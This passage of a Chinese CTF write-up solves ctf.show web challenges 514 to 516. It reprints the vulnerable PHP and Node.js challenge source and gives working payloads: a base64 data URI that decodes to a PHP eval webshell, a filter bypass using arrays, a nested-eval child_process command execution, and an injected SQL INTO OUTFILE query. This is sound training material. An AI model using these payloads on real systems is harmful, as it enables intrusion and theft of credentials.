class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line">					<span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">					<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">					<span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line">					<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkConfig</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVar</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\(|\[|\`|\&#x27;|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">					<span class="keyword">eval</span>(<span class="string">&#x27;$v=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">					<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$v</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFoot</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">			<span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$foot</span>))&#123;</span><br><span class="line">				<span class="variable">$foot</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$foot</span>);</span><br><span class="line">				<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|=|php|sess|log|phar|\.|\[|\&#123;|\(|_/&#x27;</span>, <span class="variable">$foot</span>))&#123;</span><br><span class="line">					<span class="keyword">include</span>(<span class="variable">$foot</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;api&#x2F;admin_settings.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 15:50:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 16:26:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;api&#x2F;admin_templates.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-19 18:49:54</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 17:17:07</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$user</span>))&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select id,name,type,path,des from templates limit 0,10&quot;</span>;</span><br><span class="line">		<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="variable">$temps</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>);</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="variable">$temps</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="variable">$row</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$row</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span> =<span class="string">&quot;update templates set name=&#x27;<span class="subst">&#123;$row-&gt;name&#125;</span>&#x27;,path=&#x27;<span class="subst">&#123;$row-&gt;path&#125;</span>&#x27;,type=&#x27;<span class="subst">&#123;$row-&gt;type&#125;</span>&#x27;,des=&#x27;<span class="subst">&#123;$row-&gt;des&#125;</span>&#x27; where id =<span class="subst">&#123;$row-&gt;id&#125;</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新成功&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;getContents&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="variable">$template</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$template</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$template</span>-&gt;path))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$template</span>-&gt;path)));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$path</span>))&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>); </span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:  attachment; filename=&quot;&#x27;</span> . <span class="variable">$path</span>. <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|phar|ini|settings/i&#x27;</span>, <span class="variable">$name</span>))</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#x27;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="comment"># code...</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$row</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;name))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;type))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;des))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;path))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;id))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br></pre></td></tr></table></figure>

<p>这次我们直接包含一个2.sml文件,其中内容换成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4x</span></span><br></pre></td></tr></table></figure>

<p>但是需要绕过这行,简单使用数组绕过就好</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#x27;</span>, <span class="variable">$content</span>))&#123;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414182124982.png" alt="image-20220414182124982"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414183409943.png" alt="image-20220414183409943"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414182908939.png" alt="image-20220414182908939"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414183420553.png" alt="image-20220414183420553"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414183454050.png" alt="image-20220414183454050"></p>
<h1 id="web515"><a href="#web515" class="headerlink" title="web515"></a>web515</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="keyword">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> _= <span class="keyword">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title function_ invoke__">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET users listing. */</span></span><br><span class="line">router.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; title: <span class="string">&#x27;æˆ‘æ˜¯å¤è¯»æœº&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(req.body.user!=<span class="literal">null</span>)&#123;</span><br><span class="line">		msg = req.body.user;</span><br><span class="line">		<span class="keyword">if</span>((msg.<span class="keyword">match</span>(/proto|process|<span class="keyword">require</span>|exec|<span class="keyword">var</span>|<span class="string">&#x27;|&quot;|:|\[|\]|[0-9]/))!==null || msg.length&gt;40)&#123;</span></span><br><span class="line"><span class="string">		  	res.render(&#x27;</span>index<span class="string">&#x27;, &#123; title: &#x27;</span>æ•æ„Ÿä¿¡æ¯ä¸å¤è¯»<span class="string">&#x27; &#125;);</span></span><br><span class="line"><span class="string">		&#125;else&#123;</span></span><br><span class="line"><span class="string">			res.render(&#x27;</span>index<span class="string">&#x27;, &#123; title: eval(msg) &#125;);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;else&#123;</span></span><br><span class="line"><span class="string">		res.render(&#x27;</span>index<span class="string">&#x27;, &#123; title: &#x27;</span>æˆ‘æ˜¯å¤è¯»æœº<span class="string">&#x27; &#125;);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	 </span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">module.exports = router;</span></span><br></pre></td></tr></table></figure>

<p>过滤了一些字符</p>
<p>我们采用eval嵌套</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?a=<span class="keyword">require</span>( <span class="string">&#x27;child_process&#x27;</span> ).<span class="title function_ invoke__">spawnSync</span>( <span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;/&#x27;</span>] ).stdout.<span class="title function_ invoke__">toString</span>()</span><br><span class="line">POST</span><br><span class="line">&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;eval(req.query.a)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414184559957.png" alt="image-20220414184559957"></p>
<h1 id="web516"><a href="#web516" class="headerlink" title="web516"></a>web516</h1><p>关键语句,不太懂js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctx.body=&#x27;&lt;h3&gt;Hello &#x27;+user[0].username+&#x27;&lt;/h3&gt; your name is: &#x27;+user[0].username+&#x27; your id is: &#x27;+user[0].id+ &#x27; your password is: &#x27;+eval(&#x27;md5(&#x27;+user[0].password+&#x27;)&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>);<span class="keyword">const</span> <span class="variable constant_">init</span>=<span class="title function_ invoke__">async</span>()=&gt;&#123;await User.sequelize.<span class="title function_ invoke__">query</span>(<span class="string">&quot;select password from Users where username=&#x27;admin&#x27; into outfile &#x27;/app/public/flag&#x27;;&quot;</span>,&#123;type:User.sequelize.SELECT&#125;);&#125;;<span class="title function_ invoke__">init</span>(</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414185417494.png" alt="image-20220414185417494"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414185459158.png" alt="image-20220414185459158"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414185522037.png" alt="image-20220414185522037"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/ctf-show/">ctf.show</a><a class="post-meta__tags" href="/tags/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/">中期测评</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/ctf.show/XXE/"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2016/10/22/17/46/mountains-1761292_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XXE</div></div></a></div><div class="next-post pull-right"><a href="/ctf.show/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2015/10/30/20/13/sea-1014710_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">代码审计</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/ctf.show/CMS/" title="CMS"><img class="cover" src="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg" alt="cover"><div class="content 